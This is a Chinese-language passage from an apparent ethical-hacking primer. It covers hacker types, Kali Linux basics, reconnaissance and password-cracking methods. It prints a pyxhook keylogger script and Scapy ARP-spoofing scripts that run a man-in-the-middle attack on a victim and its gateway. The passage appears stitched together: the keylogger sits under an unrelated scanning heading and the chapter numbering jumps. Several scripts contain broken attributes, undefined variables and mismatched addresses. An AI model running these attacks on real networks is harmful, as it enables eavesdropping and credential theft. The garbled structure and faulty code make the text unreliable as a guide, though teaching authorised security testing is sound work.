## 什么是道德黑客？

首先，我们需要更深入地观察道德黑客或道德黑客攻击。

这些术语用于描述由个人或公司实施的黑客行为，目的是确定网络或计算机是否存在任何威胁或潜在威胁。

伦理黑客会尝试绕过系统的安全限制，然后到处寻找是否有恶意黑客可能为了其自身需求而利用的弱点。

这些信息将由该组织用于提高系统的安全性，以消除或至少最小化任何潜在的攻击。

黑客攻击是指我们可以用来寻找系统内部某些漏洞的过程，然后我们可以利用这些漏洞获取系统的访问（通常是未经授权的访问），以执行某些恶意活动。

黑客使用的方法取决于他们的动机，但黑客攻击被认为是非法的，如果你在作案时被抓获，将会导致非常严重的后果。

然而，在某些情况下，黑客攻击可以是合法的，主要是在获得许可的情况下进行的。

计算机专家被公司聘用来入侵系统是非常常见的，希望能发现系统中的漏洞，并在黑帽黑客出现之前将其切断。

这是可以用来防止具有恶意意图的合法黑客的预防措施之一。

这类在获得许可的情况下进入系统且没有任何恶意意图的人被称为伦理黑客，他们所使用的过程被称为伦理黑客攻击。

请记住，还有其他几种介于这两者之间的类型，但我们将仅关注这两种，以便让我们更好地理解黑客攻击以及整个过程中包含的内容。

## 黑帽黑客

首先，我们将更仔细地观察黑帽黑客。

当你第一次听到“黑客”这个词时，脑海中立刻浮现出哪些想法？

这些就是黑帽黑客。

他们进入这些系统是为了在过程中获得某些个人利益。

他们可能会进行中间人攻击、记录目标计算机的击键记录，或使用其他方法来控制并获取他们真正想要的信息。

这类黑客有很多方法可以用来针对他们的目标。

他们并不避讳使用恶意软件、病毒、木洛马等来敲开门。

有时，他们的工作只是被放置在目标网络上并留在那里，直到需要为止。

但当他们是黑帽黑客时，他们总是有一个计划。

他们会找出攻击目标计算机的最佳时机，以获得最大的收益并确保他们获得最好的结果。

当黑帽黑客成功时，可能会导致公司和个人损失数百万美元以及声誉的损失。

## 白帽黑客

然后我们也可以研究白帽黑客。

这些黑客可能拥有与黑帽黑客一些相同的技术，但他们做事情有不同的动机或理由。

白帽黑客这样做此有更高尚的理由。

白帽黑客以两种方式之一执行他们的工作。

首先，他们可能会花时间查看系统，看看是否能发现漏洞，然后向管理层或控制该网络的人报告此情况。这些白帽黑客也可能是对计算机及其工作原理感兴趣的人，他们可能在尝试进入系统时发现存在一些挑战。

然后他们会决定利用那里的信息来获取个人利益，但他们并不总是拥有正确的权限。

另一方面，还有一些白帽黑客会积极寻找特定网络中出现的某些缺陷和漏洞。

有时，上一组的人在发现漏洞后会被要求进入公司工作，而有时他们已经在那里工作以保持网络安全。

然而，我们在这里处理的拼图关键在于，白帽黑客拥有进入网络的正确权限。他们在开始之前已经收集了这些许可，网络所有者也知道他们在那里以及他们在那里做什么。

最后，我们将看到所谓的灰帽黑客。

请记住，黑帽黑客和道德黑客都非常相似，在完成所有任务的技术和步骤方面，他们将使用相同的选项。

这就是为什么必须制定一些规则，以确保我们的工作被认为是道德黑客，而不是黑帽黑客。

在大多数情况下，两者之间的主要区别在于他们采取行动背后的动机。

黑帽黑客的动力是权力、金钱以及满足自己的个人需求。

白帽黑客（或称道德黑客）的动力是保护自己的信息和数据，或者保护他们所在公司的信息和数据。

那么，我们如何确保我们所做的黑客行为被认为是道德的呢？

为了让黑客行为符合道德理念，黑客需要遵循几条规则。

这些规则包括：

1. 必须获得明确许可才能进入网络。这通常会以书面形式进行，以确保双方达成一致。你可以列出你获得的所有权限，以及公司希望你避开的内容。这种许可将允许你探测网络，并发现可能导致问题的安全风险。如果你是在处理你自己的网络，当然，不需要这种书面许可。

2. 你将确保在进入他人或另一公司的网络时，尊重他们的隐私。你将对发现的漏洞保持保密，仅与该公司或个人分享。你不会发布关于该网络的信息供他人查看。

3. 当你完成想要在攻击中进行的某些工作后，你将关闭已完成的工作。确保你没有留下任何东西，也没有留下任何开启的状态供你或他人以后进入并利用。

4. 当你在搜索过程中发现网络漏洞时，你会让软件开发人员或硬件制造商知道。当这些漏洞公司尚未获知，这对保护你自己和他人尤为重要。

当你完成这类过程、渗透测试以及你尝试通过该过程完成的其他工作后，你会花一些时间与网络所有者分享信息。让他们知道系统中的漏洞在哪里，然后探索你或他们可以采取的选项，以减少甚至消除这些漏洞，确保他们无法通过它们获取你的信息。

“道德黑客”这个术语随着时间的推移受到了一些批评。这是因为有些人认为根本就不存在所谓的道德黑客。他们还认为，黑客行为就是黑客行为，无论是谁在操作以及背后的动机是什么。

然而，你会发现我们看到的这些道德黑客所的工作是非常重要的。他们帮助许多公司改进了系统安全，并且在他们所的工作上是高效且成功的。那些兴趣成为这种黑客的人必须遵守一些严格的规则和制度以维持这一点，他们中的许多人在开始之前会成为`CEH` 或`Certified Ethical Hacker”（认证道德黑客）。

## 黑客攻击的类型

现在我们对道德黑客有了更多的了解，是时候让我们了解一下在开始我们想要的黑客方法时会出现哪些选项了。根据黑客在过程中希望实现的目标，我们可以探索几种不同的类型。

我们能够处理的一些不同黑客攻击类型包括：

* 1 - 网站黑客攻击：
当黑客能够入侵网站时，意味着他们能够在未经授权的情况下控制网络服务器以及与其相关的任何软件，包括数据库以及带有的任何其他接口。

* 2 - 网络黑客攻击：
当黑客能够入侵网络时，意味着他们将使用 `Netstat`、`Tracert` 等工具收集有关网络的信息。这种攻击的意图是损害网络系统并阻碍此处的一些操作。

* 3 - 电子邮件黑客攻击：
这包括获取对电子邮件账户的授权访问，然后在未获得所有者同意的情况下使用它发送威胁、链接和其他被视为有害的活动。我们总是需要确保对我们打开或查看的邮件类型保持小心。总有很多黑客会通过电子邮件发送病毒和其他其他东西，通常带有一些恶意链接或虚假银行页面，这样你可能会泄露黑客想要的信息。对邮件中打开的任何内容保持谨慎是非常重要的，因为你不知道黑客何时会试图以此获取你的信息。

* 4 - 恶意软件和病毒：
我们大多数人对黑客攻击和恶意软件熟悉，但我们总是需要警惕这种。你会发现黑客会花花时间扩展他们已有的信息，并试图制造获取我们想要保护的信息的新恶意软件和病毒。无论你是点击了一个不好的链接，还是访问了一个带有病毒的网站，你都需要确保安装了良好的防病毒软件，以确保过程中所有信息的安全。

* 5 - 密码黑客攻击：
这是从我们正在使用的系统所存储或传输的数据中恢复秘密密码的过程。有许多不同的方法可以让黑客获取你的密码，特别是如果你没有注意增强密码强度并确保它们更难被破解。记住，在许多情况下，这些密码是你与黑客之间唯一的防线，因此在这里确保密码强壮且安全是必不可少的。

* 6 - 截图：
我们在本指南中还将查看另一个问题是如何处理键盘记录器。这是黑客可以用来短时间内收集大量关于你的个人信息的技术之一。这将使得黑客可以在你的计算机上安装一个小程序，然后记录你在自己的电脑上执行的所有按键操作。





这些信息将被发送回黑客，随着时间的推移，他们将看到你发出的信息，并看到用户名和密码的模式。

我们在这里要看到的另一个部分是截图的概念。

### 8 - 中间人攻击

我们在上一本指南中曾详细讨论过这种攻击，但它仍然是许多黑客喜欢的攻击类型，而且它可以确保你能够让事情按照你的意愿运行。

这种攻击是指黑客能够说服他人他们属于特定的网络。

然后，当该网络上的某台计算机发送信息时，信息将直接发送给黑客，而不是预期的接收方。

黑客可以直接查看这些信息，也可以在发送给消息的目标接收者之前对其进行修改以满足他们的需求。

### 9 - 计算机黑客

这是黑客通过应用不同的黑客方法窃取计算机 ID 和密码，并对该计算机系统获取未经授权的访问。

虽然有些人会担心所有黑客都是一样的，并且我们需要担心任何形式的黑客行为（无论它被视为伦理的还是不道德的），但实际上是有区别的。

作为初学者，你可能会遇到一些情况，然后会被 Linux 的目录结构让你感到困惑。

与我们可能习惯的 Windows 和 Mac 不同，Linux 操作系统不会链接回物理驱动器。

你不需要在开始工作之前处理 `C:\`，相反，我们需要使用 `/` 符号。

这个正斜非常重要，因为它向我们展示了我们正在操作的文件系统的根目录（root）。

根目录是文件系统的顶层。

所有其他目录和文件夹都位于根目录下。

将这个根目录想象成主文件夹，然后我们将使用的其他文件夹将放入其中，就像我们在 Windows 中使用的某些文件和文件夹一样。

如果可以的话，花点时间看看我们如何设计这些不同的目录，或者浏览系统看看你是否能找到其中一些。

在开始黑客攻击之前，至少掌握一些关于该系统的基础知识总是个主意，因为有时你可能希望直接在终端中导航，而不需要我们引入另一个图形化工具。

当我们位于 Kali 目录时，我们还可以处理其他一些事情。

在使用此随带的图形化表示时，我们需要探索和理解的一些内容包括：

*   `/bin`——这是存储所有二进制文件的目录。这些是帮助 Linux 运行的程序。
*   `/etc`——这通常是存储配置文件的地方。在操作 Linux 时，你几乎所有保存为文本文件的内容都会被配置并存储在 `/etc` 路径下。
*   `/dev`——这是存放所有设备文件的目录，类似于你在 Windows 设备驱动程序中找到的内容。
*   `/var`——这通常是你找到日志文件以及其他文件的地方。

## 使用 pwd 命令

现在，我们需要花点时间看一些可供我们使用的命令。

Linux 系统中有很多种可以供我们运行的命令，但我们将花一些时间查看最常用的命令。

在操作 Linux 时，我们需要关注的第一个命令包括 `pwd` 命令。

当你决定打开那个终端窗口时，你会发现自己处于默认目录中，它也被称为主目录（home directory）。

如果你想确认这一点，或者在过程中的随时双检查你处于哪个目录，你只需要输入 `bt > pwd`。

当你准备好后，这将在屏幕上显示当前目录。

为了简单起见，`pwd` 就代表当前工作目录，或者你现在正在工作的目录。

如果你现在位于主终端，你将得到 `/root` 的返回。

如果这显示在你的屏幕上，说明我们处于 root 用户的目录内部。

## 使用 cd 命令

不过，我们之前谈到的 `pwd` 命令并不是我们需要关注的唯一命令。

当我们进入实际的黑客攻击部分时，会有很多其他重要的命令。

但在开始阶段，当我们学习更多关于 Kali Linux 系统以及我们能用它做些什么时，花时间查看 `cd` 命令也是同样重要的。

当你处于想要操作的终端时，可以使用几个命令来更改你当前所处的目录。

当你使用这些命令时，它可以帮助你在想要使用的几个目录之间来回，而无需进行大量的搜索，或者感到困惑并迷失自己在哪里。



为了完成所有这一切，我们需要使用 `change directory`（切换目录）命令或 `cd` 命令。

这个 `cd` 命令将允许我们一种简单的方法，根据需要穿过并导航到目录结构的顶层。

我们将实现这一目标所需要依赖的代码如下：

```
bt > cd ..
```

你需要添加双点 `..`，因为它会告诉程序你想在目录树中向上移动一级。

这与你在 `pwd` 命令中发现的情况有点不同。使用 `pwd` 命令时，你会发现系统会带你一直回回到起点。但当你使用 `cd ..` 命令时，你是在要求系统只带你向上移动。这使得在页面或系统的部分之间跳转变得更加容易，而无需再次从顶端重新开始。

## 看一眼 Whoami 命令

我们将最后查看的命令是 `Whoami` 命令。

这个命令与其他命令稍有不同，但当程序员想要查看他们当前是以哪个用户身份登录到系统时，他们会使用它。如果你处于一个有多个用户可以登录的网络上（无论他们是否被邀请加入网络），你可能希望使用这个命令来更好地了解谁在什么时候登录了。这也是查看你个人被允许使用的权限，或者其他用户在系统上被允许做什么的好方法。

当我们谈论白帽黑客的一些不同内容时，这是一个获取大量有价值信息的绝佳方法，并在发现有许多人同时想要访问信息时就此解决一些问题。但另一方面，当我们观察一个黑帽黑客的操作时，我们看的是如何使用这个命令进入网络并引起问题，而让没人真正能检测到我们甚至在那里。

所以，为了帮助我们完成整个过程并学习你登录在那个系统的哪个用户上，代码将非常简单。你只需要输入代码 `bt > whoami` 即可。

这是一个很好的开始点，因为结果将是你当时登录的用户名称。如果你看到显示的名称是 `root`，请知道这意味着你是网络上的主计算机，或者如果你是当时网络上唯一的的计算机，那么它就是你的主计算机。

Linux 系统带的许多命令，以及我们在本指南中过的 `commands`（命令），都易于操作和学习，而且执行它们会更简单。但学习如何使用这些命令的点在于帮助你更多地了解 Linux 系统，以及我们如何共同处理它们。

如果你计划使用 Mac 或 Windows 操作系统，那么在处理 Linux 系统时，你会感到宾至如归，因为它与其他系统相似，并且很多时候你会发现你熟悉的其他部分。然而，你会发现这个系统对代码的依赖比你过去习惯的要多一点，你也必须习惯这种工作方式。但通过学习一些编码以及新系统中所找到的所有部分的位置，以及在开始你想要进行的某些黑客活动之前有一个良好的准备，你将能够让 Linux 按照我们的意愿运行。

尝试一下这些不同的部分，并看看我们上面做的一些 `commands`（命令），你会发现这是完成你黑客任务的一个简单易行的选择。当然，在我们学习这种操作系统的过程中，我们还有其他可以进一步学习的 `commands`（命令），这也是让它成为一个非常值得学习的系统的原因之一。

除了我们在上面提到的一些代码和 `commands`（命令）之外，我们还需要查看下面的一些 `commands`（命令），看看为了我们的黑客需求还能用这个系统做什么：

- `ls`: 这是 `list`（列表）的缩写。这将列出当前文件夹或目录的内容，无论是文件夹还是文件，以及这些内容运行的路径。
- `cd`: 这个命令从一个目录移动到另一个目录。
- `sudo`: 这允许许可的用户以另一个用户的身份执行新命令。
- `mkdir`: 这个命令允许你创建一个带有名称和路径的新目录或新文件夹。
- `cp`: 这个是 `copy`（拷贝）的缩写。它将从一个位置的文件复制并移动到另一个位置。
- `mv`: 这个命令将文件从一个位置移动到另一个位置。
- `tar`: 这个命令将存储并在稍后从名为 `tar` 的归文件中提取文件。
- `gzip`: 这个命令将压缩文件。它的工作原理与你在 Windows 中看到的 `.zip` 文件非常。
- `gunzip`: 这个命令将解压缩你已经用 `gzip` 压缩的文件。
- `ifconfig`: 这个命令将显示使用的网络接口，它也可以配置网络接口。
- `ping`: 这个命令通常用于检查另一个系统当前是否可以访问。

# 第 5 章：如何规划你自己的攻击

我们已经在本指南中花了一些时间来查看让 Kali 系统准备就绪所需的基础知识。这至关重要，但你阅读本指南的主要目标可能是为了找出对你的网络执行某些攻击所需的基础知识。

在这个领域，我们将探索的第一项将是关于规划你自己的黑客活动的基础。一旦我们花时间获得了关于开始新的黑客活动所需的知识，就是时候制定我们的行动计划了。

每个黑客都应该有一个攻击计划，或者对他们开始攻击时想要做的某些事的想法，以及他们认为漏洞最可能出现在哪里。你永远不想盲目行动。这会导致你在网络的某部分徘留并花费过多时间，从而更有可能让其他人发现你。这就是为什么制定计划并坚持执行它是确保你的网络长期安全的最佳方法之一。

我们提前了解的关于你网络的信息越多，这种攻击对你来说就越成功。你需要进入黑客的视角，了解什么对他们最有效，以及他们仅仅通过在线搜索就能获取到关于你网络的哪些信息。我们仍然花时间查阅并找出相同的信息。




当你检查网络并尝试寻找这些漏洞所在的位置时，没有必要检查你在系统上能想到的每一个协议。

这看起来似乎是最佳选择，但只会让事情变得更加复杂，并花费过多的时间，因为涉及的事项太多了。

检查某些漏洞的最佳方法是检查并测试最核心的部分，并确保你一次只检查一个，这样你就能立即发现问题所在的位置。

当该绘制你的攻击地图时，你需要确保你只尝试一个应用程序或一个系统，并且始终从对整体帮助最大的那一个开始。

然后，你就可以顺着列表检查所有重要的攻击，看看黑客是否可能在一切完成之前通过该漏洞得入。

如果你查看了一些协议，但仍然不确定应该从某一个还是另一个开始，或者你起初应该从哪里开始，我们可以针对此提出的一些问题包括：

* 如果有人尝试对系统进行攻击，哪部分最终会引起最大的麻烦，或者如果你丢失了某部分信息，哪部分最终会变得非常困难？
* 如果你遭受系统攻击，系统的哪个部分最脆弱，因此也是你的黑客最可能利用的部分。
* 系统中是否有某些部分记录得不够好或者几乎没有被检查？甚至是否存在一些虽然在那里但你不熟悉（或者你过去从未见过）的部分？

一旦我们花时间来检查并回答这些问题，以及在此时看起来可能相关的任何其他问题，那么列出一份你想要首先检查的各种系统和协议的列表就会容易得多。

在此过程中记录一些好的笔记，以确保你在处理系统时能够保持一切井井有序，并确保记录所有内容，这样如果你最后遇到了一些问题，以后修复它们将变得容易得多。

一个优秀的黑客在跳入你拥有的网络之前，会花费一些时间研究你的网络，看看他们能否找到所需的个人信息来暴露那里存在的漏洞。

如果你是系统所有者，很可能那里有大量关于你公司的信息，甚至关于那些帮助经营公司的人的信息，而你会错过这些信息。

但在进行这类研究时，是时候摘下所有者的帽子，更多地关注黑客的视角了。

这将让你更容易看到外面存在哪些信息，以及黑客可能会利用哪些信息来对付你。

记住，在需要收集这些痕迹时，你可能有很多选项可以供选择，但你应该开始的第一位是在线搜索。

在这里，你只需输入你的名字或你的公司名称，看看那里是否有大量信息。

然后你可以通过探测进一步缩小范围，以发现其他人对你或你正在处理的系统能看到什么。

你可能还会发现使用本地的 `port scanner` 是发现这些问题的一种好方法，因为。

* 然而，这只是过程的开始，因为它只会向我们展示一些可以开展的基础知识。

这意味着对于我们来说，深入挖掘是重要的，否则我们可能会漏掉计算机和网络发出的某些内容，而真的不知道发生了什么。

## 开始映射网络

一旦我们花了一些时间进行深度研究，并观察黑客能够关于我们自己、我们的网络以及我们的公司学到什么，现在是时候开始处理之前讨论过的某些伦理黑客操作了。

请记住，一个连接了大量设备和信息的网络总是需要更多工作来保护。

这是因为有许多人必须使用它，而你必须始终确保不会有一台或多台设备因使用不当而被黑客接管。

在游戏的这个阶段，我们将花费时间来梳理并绘制我们正在使用的网络地图。

这是一个重要的步骤，因为这将更容易看到你的系统或网络的足迹是什么，以及它为其他感兴趣查看的人留下了什么。

开始这项工作的一个好地方是一个名为 `Whois` 的网站。

这个网站最初的设计目的是帮助公司确定他们喜爱的域名是否可用，或者是否已被占用。

但现在，它也是了解更多关于特定域名所有者和注册信息的好地方。

如果你浏览这个网站并对你拥有的域名进行域名搜索，如果你的名字出现了，那么关于你公司的联系信息（至少包括姓名和电子邮件地址）在这个网站上被展示的概率就会增加。

你需要了解这些信息，以便采取恰当的步骤将其关闭，并确保它不会影响到你业务的运行。

`WhoIs` 网站能够为我们提供大量信息。

例如，它将向我们显示你查询的特定域名上找到的所有 `DNS` 服务器信息，以及一些关于你正在使用的服务提供商将提供的技术支持的有用信息。

这并不是我们进行研究以查看世界上广播了关于我们业务信息的唯一地方。

我们还可以查看一个名为 `DNSstuf` 的网站。

这个网站将向我们展示更多关于我们自己域名的信息，查看它以了解其他黑客能看到关于你的什么是非常重要的。

我们在这里能够看到的其他一些信息将包括：
* 关于主机如何处理该特定名称的所有电子邮件的信息。

* 关于域名注册的一些对黑客可能实用的通用信息。
* 关于这是否带有垃圾邮件主机的信息。

这只是你可以访问的以寻找其中一些信息的网站之一，检查其中的几个网站是一个好主意。

这有助于对你的域名和公司可能在网上泄出的信息有一个良好的开始，但还有其他几个你应该检查的地方，包括：

`Google Groups` 和论坛是你进行某些工作时需要小心的地方之一。

这些地方连同其他论坛一起，可以是黑客进行搜索并了解更多关于你网络的绝佳场所。

事实上，你可能会对这些论坛上关于你业务的可用信息种类感到意外，尽管你并不是那个在那里发布帖的人。

这里的好消息是，如果你在大多数论坛上发现了这类信息，你可以请求他们将其删除以保护你的安全。

你需要能够提供你的证明来说明你为什么想要删除这些内容，但这可以帮助你确保随之而来的安全问题尽可能降到最低。

## 系统扫描的重要性

当你完成上述我们花费时间完成的一些步骤时，你现在应该已经看到，目标是确定会有多少关于你的网络和系统信息在网上被发现，这将让你更好地了解黑客可能去哪里寻找收集所需的信息，然后开始对你发起攻击。

我们在这里必须记住，这是一个过程，它需要一些时间。

黑客会非常小心，并确保他们的研究是详尽且深入的，你也需要这样做。

但当你找到所需的信息后，你就可以进行系统扫描了，以确保系统和网络是安全的，并且所有的潜在漏洞都得到了处理。

这些扫描将非常有用，并会显示你的系统中发现的一些不同漏洞。

```python
import pyxhook

### 将此更改为你的日志文件路径
log_file = '/home/aman/Desktop/file.log'

### 每当按下按键时，都会调用此函数
def OnKeyPress(event):
    fob = open(log_file, 'a')
    fob.write(event.Key)
    fob.writer('\n')
    if event.ASCII==96: #96 是反引号的 asci 值
        fob.close()
        new_hook.cancel()

### 实例化 HookManager 类
new_hook=pyxhook.HookManager()

### 监听所有按键记录
new_hook.KeyDown=OnKeyPress

### 挂钩键盘
new_hook.HookKeyboard()

### 开始会话
new_hook.start()
```

第 8 章：如何使用 Linux 创建中间人攻击

中间人攻击（Man in the Middle attack）是黑客获取关于你网络信息的一种非常强大的手段。这种攻击可以是主动的，也可以是被动的。

有时，它仅包括个人进入你的网络，观察并查看他们能发现什么。而在其他时候，它是更主动的，黑客会主动入侵网络并窃取内部信息。无论何种方式，这对你的网络安全都是危险的。在黑客进入你的系统一段时间后，他们很可能会使用这种中间人攻击。一些黑客会发现，仅仅进入系统并监听数据就足够了；而另一些人倾向于使用更主动的方法，这让他们获得他们想要的网络控制权。这些就是中间人攻击。





当黑者到达这一步时，他们还能做其他一些事情，包括：

### 1. 会话劫持 (Session hijack)
黑者能够做的第一之一是利用伪造的 `ARP` 包来窃取会话 ID，这样他们以后就可以这些凭据进入系统，并在稍后执行他们想做的事情。

### 2. DoS 攻击
这可以在我们之前提到的 `ARP` 欺骗同时进行。它将帮助将网络 IP 地址名称映射到黑者的 MAC 地址上。然后，所有给黑者的数据将以这种速度直接发送到目标计算机，导致系统过载，使其无法再做出响应。

### 3. 中人攻击 (Man in the middle attack)
在此类攻击中，黑者将成为网络的一部分，但没有人能发现他们的存在。黑者能够修改并拦截目标与网络中其他人之间发生的所有信息。然后，信息甚至可以被修改并发送回系统，而通信双方都不会知道黑者曾出现过或进行过任何更改。

现在我们对这种中间攻击有了进一步的了解，也知道了为什么黑者可能会使用它，现在是时候看看我们可以做什么来实施这种欺骗，并借助 `Python` 语言和 `Kali Linux` 开始编写其中一个中间攻击来完成工作了：

对于这一部分，我们将使用 `Scapy`。目标和黑者的计算机位于同一个 `10.0.0.0/24` 网络。黑者计算机的 IP 地址将是 `10.0.0.231`，MAC 地址为 `00:14:38:00:0:01`。对于目标计算机，我们将使用 IP 地址 `10.0.0.209`，其 MAC 地址为 `00:19:56:00:00:01`。

在这里，我们将通过伪造 `ARP` 包来开始这次攻击以欺骗受害者，并将使用 `Scapy` 模块来实现这一点。

```python
>>>arpFake = ARP()
>>>arpFake.op=2
>>>arpFake.psrc="10.0.0.1"
>>>arpFake.pdst="10.0.0.209"
>>>arpFake.hwdst="00:14:38:00:00:02"
>>>arpFake.show()
```

现在，这是我们开始处理中间攻击的好时机。但这种方法会产生一个重大问题。主要问题是默认网关最终会发送带有正确 MAC 地址的 `ARP` 包。这意味着在某个时刻，目标将不再被黑者欺骗，通信将不再像以前那样流向黑者。

这里的好消息是，有一个解决方案可以帮助解决这个问题并让一切重回正轨。这个解决方案是黑者将在通信中进行嗅探，无论默认网关最终向哪里发送 `ARP` 回复，黑者都将利用这一点来帮助欺骗目标。

我们用来实现这一点的代码包括：

```python
#!/usr/bin/python
### Import scapy
from scapy.all import*

## Setting variable
attIP="10.0.0.231"
attMAC="00:14:38:00:00:01" evenvicIP="10.0.0.209"
vicMAC="00:14:38:00:00:02"
dgwIP="10.0.0.1"
dgwMAC="00:19:56:00:00:01"

## Forge the ARP packet
arpFake = ARP()
arpFake.op=2
arpFake.psr=dgwIP
arpFake.pdst=vicIP
arpFake.hwdst=vicMAC

### While loop to send ARP
### when the cache is not spoofed
while True:
    # Send the ARP replies
    send(arpFake)
    print "ARP sent"
    #Wait for an ARP replies from the default GW
    sniff(filter="arp and host 10.0.0.1", count=1)
```

为了帮助我们确保此脚本以正确的方式运行，我们必须在这里停下，并确保它被保存为 Python 使用的文件之一。一旦我们花时间将其全部保存，你将是该文件的管理员，并可以在任何时候以相应的权限运行该文件。

现在，我们可以继续处理此过程的下一个部分。此时，目标发送到我们正在使用的网络或我们设置的网络之外的任何网络的任何通信，在通过其默认网关后，都应该直接发送给黑者。

这里仍然有一个我们需要处理的问题。虽然在这种情况下，黑者能够看到目标与任何他们想要通信的其他人之间的某些信息，但我们会发现我们完全无法阻止这些信息。信息仍然直接发送给预期的接收者，黑者无法进行任何更改。这是由于我们完全没有对该网关的 `ARP` 表进行任何欺骗。

我们需要确保此能够发生并为黑者提供更多所需控制权的代码如下：

```python
#!/usr/bin/python
### Import scapy
from scapy.all import*

### Setting variables
attIP="10.0.0.231"
attMAC="00:14:38:00:00:01"
vicIP="10.0.0.209"
dgwIP="10.0.0.1"
dgwMAC="00:19:56:00:00:01"

### Forge the ARP packet for the victim
arpFakeVic = ARP()
arpFakeVic.op=2
arpFakeVic.psr=dgwIP
arpFakeVic.pdst=vicIP
arpFakeVic.hwdst=vicMAC

# Forge the ARP packet for the default GQ
arpFakeDGW = ARP()
arpFakeDGW.op=2
arpFakeDGW.psrc=vicIP
arpFakeDGW.pdst=dgwIP
arpFakeDGW.hwdst=dgwMAC

### While loop to send ARP
### when the cache is not spoofed
while True:
    # Send the ARP replies
    send(arpFakeVic)
    send(arpFakeDGW)
    print "ARP sent"
    # Wait for an ARP replies from the default GW
    Sniff(filter="arp and host 10.0.0.1 or host 10.0.0.209", count=1)
```

在这一切准备就绪后，你已经完成了你的第一个中间攻击。

## 密码加密的重要性

现在我们需要快速查看一下被称为密码加密的内容。

我们还将查看一些用于获取并使用密码的其它黑客方法，即使密码已经经过了加密。

一旦你能够在账户上创建一个新密码，它将通过一个加密算法。

这将产生一个我们看到的、难以阅读且加密的字符串。

当然，该算法的设置使得我们无法反转现有的哈希值（hashes），这将保持密码的安全，这也是人们无法进入系统并直接看到你所使用的密码的主要原因。

此外，每当你想要破解 `Linux` 系统上的密码时，密码破解过程都会增加第二层难度。

`Linux` 能够通过引入密码随机化的想法来增加这种新的安全级别。

这是通过在密码中添加“盐”（salt），有时还有另一个值来实现的，这改变了密码的唯一性，使得即使两个用户选择了相同的密码，也不会产生相同的哈希值。

当然，你有一些工具可供你使用，我们可以尝试使用它们来破解或恢复一些丢失的密码。

你可以选择的某些选项包括：

1. **字典攻击（The dictionary attack）**：
   通过字典攻击，程序将尝试字典中找到的单词，然后将这些单词与数据库或系统数据库中密码的哈希值进行比对。

   当密码很弱或者当它们仅仅依赖于替代拼写时，这种方法将有效。例如写成 `pa$$word` 而不是 `password`。

   如果你想双检网络上的所有用户都选择了强密码，那么你可以尝试这种攻击以确保正确性。

2. **暴力破解（A brute force attack）**：
   这些方法可以帮助我们破解几乎任何类型的密码，因为它可以产生字符、数字和字母的组合，直到找到正确的密码。

   但记住，这种方法速度缓慢且需要大量时间，如果用户拥有非常强的密码并定期更改，它可能会失败。由于这种方法在输入各种组合上花费的时间很久，它通常是黑客不会浪费时间的方法。

3. **彩虹攻击（Rainbow attacks）**：
   这些是我们可以用来破解系统中发现的某些哈希密码的工具，当使用良好时它们是可以成功的。与我们提到的其他两种方案相比，这种工具的速度很快。

   我们看到的最大的缺点是，只要密码在 14 个字符以内，它就能破解任何密码。如果密码更长，就会遇到麻烦。这也是保护免受这种攻击的一种良好方法。

当我们对密码进行加密时，黑客仍有可能使用上述某些工具侵入并获取他们想要的信息。但在大多数情况下，你会发现使用这种加密、使用安全网络并确保密码强大且难以猜测，是确保黑客无法进入你个人网络的最佳方法之一。
